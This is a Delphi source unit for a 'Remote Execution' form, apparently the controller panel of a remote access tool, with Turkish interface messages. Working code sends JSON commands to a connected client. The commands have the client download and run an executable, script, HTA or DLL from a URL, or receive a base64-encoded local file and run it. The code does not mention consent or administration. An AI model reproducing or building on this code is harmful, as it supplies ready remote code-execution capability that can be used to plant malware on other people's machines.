unit UnitRemoteExecution;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.StdCtrls, System.JSON,
  System.NetEncoding, ncLines;

type
  TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterProc = procedure(aLine: TncLine) of object;

  TForm11 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    Edit1: TEdit;
    Button1: TButton;
    Label1: TLabel;
    Edit2: TEdit;
    Label2: TLabel;
    Button2: TButton;
    Button3: TButton;
    Label3: TLabel;
    Edit3: TEdit;
    Button4: TButton;
    Button5: TButton;

    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);

  private
    FLine: TncLine;
    FClientID: string;
    FSendJSON: TSendJSONProc;
    FOnCloseProc: TUnregisterProc;
    FOpenDialog: TOpenDialog;

    function IsAllowedExtension(const AFileName: string): Boolean;
    function GetBase64FileContent(const AFilePath: string): string;

  public
    procedure SetupForClient(ALine: TncLine; const AClientID: string;
      ASendJSON: TSendJSONProc; AOnCloseProc: TUnregisterProc);
    procedure DetachCallbacks;
    procedure HandleResponse(JSONObj: TJSONObject);
  end;

var
  Form11: TForm11;

implementation

{$R *.dfm}

function TForm11.IsAllowedExtension(const AFileName: string): Boolean;
var
  Ext: string;
begin
  Ext := LowerCase(ExtractFileExt(AFileName));
  Result := (Ext = '.exe') or (Ext = '.bat') or (Ext = '.vbs') or (Ext = '.py') or (Ext = '.hta') or (Ext = '.dll');
end;

function TForm11.GetBase64FileContent(const AFilePath: string): string;
var
  FS: TFileStream;
  Bytes: TBytes;
begin
  Result := '';
  if not FileExists(AFilePath) then Exit;
  try
    FS := TFileStream.Create(AFilePath, fmOpenRead or fmShareDenyWrite);
    try
      SetLength(Bytes, FS.Size);
      if FS.Size > 0 then
        FS.ReadBuffer(Bytes[0], FS.Size);
      Result := TNetEncoding.Base64.EncodeBytesToString(Bytes);
      // STRIP ALL NEWLINES/CARRIAGE RETURNS TO AVOID SPLITTING THE SOCKET PACKET FRAME!
      Result := Result.Replace(#13, '').Replace(#10, '');
    finally
      FS.Free;
    end;
  except
    Result := '';
  end;
end;

procedure TForm11.SetupForClient(ALine: TncLine; const AClientID: string;
  ASendJSON: TSendJSONProc; AOnCloseProc: TUnregisterProc);
begin
  FLine := ALine;
  FClientID := AClientID;
  FSendJSON := ASendJSON;
  FOnCloseProc := AOnCloseProc;
  Caption := 'Remote Execution - Client: ' + FClientID;

  // Programmatically bind control events to ensure they always execute regardless of DFM state!
  Button1.OnClick := Button1Click;
  Button2.OnClick := Button2Click;
  Button3.OnClick := Button3Click;
  Button4.OnClick := Button4Click;
  Button5.OnClick := Button5Click;
end;

procedure TForm11.DetachCallbacks;
begin
  FLine := nil;
  FSendJSON := nil;
  FOnCloseProc := nil;
end;

procedure TForm11.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Action := caFree;
  if Assigned(FOnCloseProc) and Assigned(FLine) then
    FOnCloseProc(FLine);
end;

procedure TForm11.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  URL: string;
  CleanURL: string;
  QueryPos: Integer;
begin
  URL := Trim(Edit1.Text);
  if URL = '' then
  begin
    MessageBox(Handle, 'Lütfen geçerli bir uzak dosya adresi girin.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  CleanURL := URL;
  QueryPos := Pos('?', CleanURL);
  if QueryPos > 0 then
    CleanURL := Copy(CleanURL, 1, QueryPos - 1);

  if not IsAllowedExtension(CleanURL) then
  begin
    MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py, .hta ve .dll dosya türleri desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  if Assigned(FSendJSON) and Assigned(FLine) then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'remote_execute_url');
      JSONObj.AddPair('url', URL);
      FSendJSON(FLine, JSONObj);
    finally
      JSONObj.Free;
    end;
  end;
end;

procedure TForm11.Button3Click(Sender: TObject);
begin
  if FOpenDialog = nil then
  begin
    FOpenDialog := TOpenDialog.Create(Self);
    FOpenDialog.Filter := 'Allowed Executables (*.exe;*.bat;*.vbs;*.py;*.hta)|*.exe;*.bat;*.vbs;*.py;*.hta';
  end;

  if FOpenDialog.Execute then
  begin
    if IsAllowedExtension(FOpenDialog.FileName) then
      Edit2.Text := FOpenDialog.FileName
    else
      MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py ve .hta dosya türleri seçilebilir.', 'Hata', MB_OK or MB_ICONERROR);
  end;
end;

procedure TForm11.Button2Click(Sender: TObject);
var
  FilePath: string;
  FileName: string;
  Content64: string;
  JSONObj: TJSONObject;
begin
  FilePath := Trim(Edit2.Text);
  if FilePath = '' then
  begin
    MessageBox(Handle, 'Lütfen önce bir dosya seçin.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  if not FileExists(FilePath) then
  begin
    MessageBox(Handle, 'Belirtilen dosya bulunamadı.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  FileName := ExtractFileName(FilePath);
  if not IsAllowedExtension(FileName) then
  begin
    MessageBox(Handle, 'Sadece .exe, .bat, .vbs, .py ve .hta dosya türleri desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  Content64 := GetBase64FileContent(FilePath);
  if Content64 = '' then
  begin
    MessageBox(Handle, 'Dosya okunamadı veya boş.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  if Assigned(FSendJSON) and Assigned(FLine) then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'remote_execute_local');
      JSONObj.AddPair('filename', FileName);
      JSONObj.AddPair('content', Content64);
      FSendJSON(FLine, JSONObj);
    finally
      JSONObj.Free;
    end;
  end;
end;

procedure TForm11.Button4Click(Sender: TObject);
var
  DLLOpenDialog: TOpenDialog;
begin
  DLLOpenDialog := TOpenDialog.Create(Self);
  try
    DLLOpenDialog.Filter := 'DLL Files (*.dll)|*.dll';
    if DLLOpenDialog.Execute then
    begin
      if LowerCase(ExtractFileExt(DLLOpenDialog.FileName)) = '.dll' then
        Edit3.Text := DLLOpenDialog.FileName
      else
        MessageBox(Handle, 'Sadece .dll dosya türü seçilebilir.', 'Hata', MB_OK or MB_ICONERROR);
    end;
  finally
    DLLOpenDialog.Free;
  end;
end;

procedure TForm11.Button5Click(Sender: TObject);
var
  FilePath: string;
  FileName: string;
  Content64: string;
  JSONObj: TJSONObject;
begin
  FilePath := Trim(Edit3.Text);
  if FilePath = '' then
  begin
    MessageBox(Handle, 'Lütfen önce bir DLL dosyası seçin.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  if not FileExists(FilePath) then
  begin
    MessageBox(Handle, 'Belirtilen dosya bulunamadı.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  FileName := ExtractFileName(FilePath);
  if LowerCase(ExtractFileExt(FileName)) <> '.dll' then
  begin
    MessageBox(Handle, 'Sadece .dll dosya türü desteklenir.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  Content64 := GetBase64FileContent(FilePath);
  if Content64 = '' then
  begin
    MessageBox(Handle, 'Dosya okunamadı veya boş.', 'Hata', MB_OK or MB_ICONERROR);
    Exit;
  end;

  if Assigned(FSendJSON) and Assigned(FLine) then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'remote_execute_local');
      JSONObj.AddPair('filename', FileName);
      JSONObj.AddPair('content', Content64);
      FSendJSON(FLine, JSONObj);
    finally
      JSONObj.Free;
    end;
  end;
end;

procedure TForm11.HandleResponse(JSONObj: TJSONObject);
var
  Status: string;
  Msg: string;
begin
  Status := '';
  Msg := '';
  if Assigned(JSONObj.Values['status']) then Status := JSONObj.Values['status'].Value;
  if Assigned(JSONObj.Values['message']) then Msg := JSONObj.Values['message'].Value;

  if SameText(Status, 'success') then
    MessageBox(Handle, PChar('İşlem Başarılı: ' + Msg), 'Bilgi', MB_OK or MB_ICONINFORMATION)
  else
    MessageBox(Handle, PChar('Hata Oluştu: ' + Msg), 'Hata', MB_OK or MB_ICONERROR);
end;

end.